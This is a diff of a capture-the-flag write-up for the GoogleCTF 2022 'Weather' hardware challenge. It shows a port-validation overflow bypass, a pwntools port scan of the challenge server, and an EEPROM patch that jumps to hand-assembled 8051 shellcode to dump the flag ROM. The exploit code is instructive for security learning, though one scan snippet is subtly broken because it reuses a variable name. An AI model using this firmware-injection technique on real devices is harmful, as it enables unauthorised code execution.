@@ -1,8 +1,4 @@
-<style>
-    p{
-        text-align: justify
-    }
-</style>
+
 # GoogleCTF 2022 - Hardware - Weather writeup
 This challenge is what I consider a good learning experience, 
 and a perfect model for how hardware challenges should be like. 
@@ -10,12 +6,7 @@ It was really interesting not only in terms of the problems you needed to
 solve to get the flag, but also in terms of the additional
 research you needed to do to get a clear picture of how the system works
 exactly. I would definitely spend hours solving challenges like this
-one again.
-
-And don't expect to just sit there and read; reading is lame,
-this writeup is also a guided exercice,
-and I would recommend taking a pen, a paper, and a cup of coffee
-to enjoy the full experience.
+once again.
 
 ## Challenge description
 > Our DYI Weather Station is fully secure! No, really! Why are you
@@ -142,7 +133,8 @@ in addition to `POWEROFF` and `POWERSAVE`, which were left undocumented.
 
 Anyway, as the law of reverse engineering dictates, we must start 
 reading the source code from the main function, I would recommand taking
-a look at the function, but tl;dr: it continously checks for user commands received via the serial input and handles them.
+a look at the function, but tl;dr: it continously checks for user commands
+received via the serial input and handles them.
 
 The two valid commands are:
 
@@ -192,22 +184,243 @@ bool is_port_allowed(const char *port) {
   return false;
 }
 ```
-What we would like to have is the function reaching `return true` for any
-arbitrary port, the only way to reach it is by having `allowed` still set
-to `true` and reaching the end of the string from `ALLOWED_I2C`. 
-`while(*pa&& *pb)` will loop until either `*pa == 0` or `*pb == 0`, so 
-if the `pa` is the string that terminates first, we can have the right part
-of the condition `allowed && *pa == '\0'` guarentedd to be true. As for
-`allowed`, it is only set to `false` when there `*pa != *pb` inside the loop, the same loop that breaks if any of the strings reaches the end.
+When the port is validated, the string is passed to 
+`uint8_t str_to_uint8(const char* s)` to be converted to an unsigned 8-bit
+integer.
+```c
+uint8_t str_to_uint8(const char *s) {
+  uint8_t v = 0;
+  while (*s) {
+    uint8_t digit = *s++ - '0';
+    if (digit >= 10) {
+      return 0;
+    }
+    v = v * 10 + digit;
+  }
+  return v;
+}
+```
+The original intent behind this function is returning true only when the
+port string is exactly 101, 108, 110, 111 or 119, but the implementation
+is incorrect, and if you use some of your grey matter you can figure
+out that it would return true even when the string only starts with those
+value, and so, for example `1013` would also be valid since it starts with
+101.
 
-If it didn't become obvious already, this function can be exploited by
-having `port` start with a valid port sequence(example `101`) followed by
-any arbitrary number to make it overflow to the desired port value when
-converted to a `uint8_t`.
+So as long as we have a number starting with 101(or the others), we can
+figure out a value that, when wrapped around as it is convert to a uint8
+will give us any arbitrary port we wish.
 
+It would be useful to write a function that would take an input port and
+generate an exploitable port that would pass the validation function and
+when converted to a `uint8_t` would wrap around to the desired port.
 
+What we want to do is solve the equation for X `101..X % 256 = port`,
+where `101..X` denotes a concatenation. But since I am bad at modular
+arithmetics, I will just bruteforce the value of X.
+```py
+def exploit_port(port):
+  i = 0
+  while True:
+    if int('101' + str(i)) % 256 == port:
+      return '101' + str(i)
+    i += 1
+```
+
+### EEPROM I2C port
+The second problem is that we do not know the I2C port that would let us
+program the EEPROM, the datasheet however mentions something about pinging
+a device. So if we can just ping all possible ports(256 of them), we would
+be able to guess which one is the EEPROM.
+
+Let's start by the basics:
+```py
+from pwn import *
+
+p = remote('weather.2022.ctfcompetition.com',1337)
+```
+All we need to do now, is make a dummy read operation and if we do not get
+an error then the port is valid. We could've used 0 for the request length
+and do as the datasheet says *a ping*, but the program will refuse a value
+of 0, so instead we just send 1 as request length.
+
+```py
+def print_all_valid_i2c_ports():
+  print('Valid I2C ports:')
+  for p in range(256):
+    print(f'\r\t{p}', end='', flush=True)
+    command = f'r {exploit_port(p)} 1'
+    p.sendafter(b'? ', command.encode('utf-8'))
+    if not 'err' in p.recvline().decode('utf-8'):
+      print(' X')
+```
+
+When we call that function, we get the following output:
+```
+Existing i2c ports:
+  33 X
+  101 X
+  108 X
+  110 X
+  111 X
+  119 X
+```
+
+We already know from the datasheet that the ports `101`,`108`,`110`,`111`
+and `119` are used by the sensors, that leaves only port `33` for the
+EEPROM, so it is safe to assume it is the one we are looking for.
+
+---
+The rest of the source code is not very interesting, it only consists of
+a simple tokenizer for the input commands, a serial print function(we will
+make use of this one later) and I2C read and write functions.
+
+## EEPROM
+The datasheet specifies that we cannot reset the EEPROM without physical
+access to the device, what we can however do through the I2C interface is
+reading, and clearing bits to 0.
+
+Take a look at [exploit.py] for the implementation of some helper functions
+to read pages from the EEPROM and apply a clear mask.
+
+If we read all the content of the EEPROM and dump it into a file we get
+[eeprom].
+
+The most interesting part about the content of the EEPROM is at the end
+```
+00009f0 0031 3031 0038 3131 0030 3131 0031 3131
+0000a00 0039 ffff ffff ffff ffff ffff ffff ffff
+0000a10 ffff ffff ffff ffff ffff ffff ffff ffff
+*
+0001000
+```
+
+It is completely filled FFs, and since we can only clear bits, this
+basically means we can write whatever we want in this area of the EEPROM,
+and remember the EEPROM is what stores the code executed by the
+microcontroller, so we can get RCE if we want to.
+
+## Putting everything together
+Now all that is needed is putting some shellcode in that area full of FFs
+and jumping to that section of the code, to do that however we must find
+a place where we can modify the code only by clearing to put a jump to
+the region with FFs. I found a good candidate for that in the
+`serial_print` function(at address 0x0123)
+```
+0000120 80f0 ad22 ae82 af83 8df0 8e82 8f83 12f0
+                  ^ beginning of serial_print
+0000130 fc07 1660 f3e5 fc60 828d 838e f08f 0712
+```
+We can change `82` to `02`(opcode for LJMP) just by clearing bits, and
+`AF83` to `0C00`, this address is arbitrary and any address in the FF
+region will do(of course it needs to be reachable from AF83 just by
+clearing bits), as for the first byte at 0x0123, we can change it to a 
+NOP(0x00) so that it is ignored.
+
+What we are essentially doing here is inserting the following shellcode
+inside `serial_print`:
+```s
+NOP
+LJMP 0x0C00
+```
+
+The choice of the function `serial_print` was semi-arbitrary, we could've
+used any other function for the jump, but it also wqas strategic since
+it is immediatly called after the write operation is done, so we don't
+need to send any other command to do the jump, it will just happen
+instantly.
+
+Now all that is needed is some subprogram that would read the flagROM
+character by character and send them over the serial line(to us).
+
+The following does the job:
+```s
+    MOV #ee, 0
+LOOP:
+    MOV A, #f3
+    JZ LOOP
+    MOV #f2, #ef
+    INC #ee
+    MOV A, #ee
+    JZ END
+    LJMP LOOP
+END:
+    MOV A, #f3
+    JZ END
+    MOV #f2, '\n'
+    SJMP $
+```
+*Using a custom syntax, '#XX' is for SFRs*
+
+It is the equivalent of the C code:
+```c
+FLAGROM_ADDR = 0;
+while(++FLAGROM_ADDR)
+{
+  while(!SERIAL_OUT_READY);
+  SERIAL_OUT_DATA = FLAGROM_DATA;
+}
+while(!SERIAL_OUT_READY);
+SERIAL_OUT_DATA = '\n';
+while(true);
+```
+
+I was too lazy to find an assembler for the 8051, so I assembled it by hand
+to:
+```py
+payload = [
+  0x75, 0xEE, 0x00,
+  0x85, 0xEF, 0xF2,
+  0x05, 0xEE,
+  0xE5, 0xEE,
+  0x60, 0x03,
+  0x02, 0x0C, 0x03,
+  0xE5, 0xF3,
+  0x60, 0xFC,
+  0x75, 0xF2, 0x0A, 
+  0x80, 0xFE
+]
+```
+
+Remember the payload should be put in its place before tampering with
+`serial_print`
+
+And finally:
+```py
+eeprom_flah_new_page(48, payload)
+eeprom_write_mask(4, p4mask) # setup serial_print
+print(p.recvline())
+```
+*Again, take a look at [exploit.py] for a full implementation*
+
+Executing the exploit gives us:
+```bash
+$ python exploit.py
+[+] Opening connection to weather.2022.ctfcompetition.com on port 1337: Done
+Delivering payload
+w 101153 69 48 165 90 165 90 138 17 255 122 16 13 250 17 26 17 159 252 253 243 252 26 12 159 3 138 13 245 127 1 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 
+w 101153 1 48 
+Page 48
+75 ee 00 85 ef f2 05 ee 
+e5 ee 60 03 02 0c 03 e5 
+f3 60 fc 75 f2 0a 80 fe 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+Injecting jump at page 4 to 0xC00
+w 101153 69 4 165 90 165 90 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 253 243 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+waiting for response...
+b'CTF{DoesAnyoneEvenReadFlagsAnymore?}\n'
+[*] Closed connection to weather.2022.ctfcompetition.com port 1337
+```
+
+Finally! The flag is `CTF{DoesAnyoneEvenReadFlagsAnymore?}`
 
 [firmware.c]: res/firmware.c
 [Device Datasheet Snippets.pdf]: res/Device%20Datasheet%20Snippets.pdf
+[exploit.py]: res/exploit.py
+[eeprom]: res/eeprom
 
 [8051]: https://en.wikipedia.org/wiki/Intel_8051
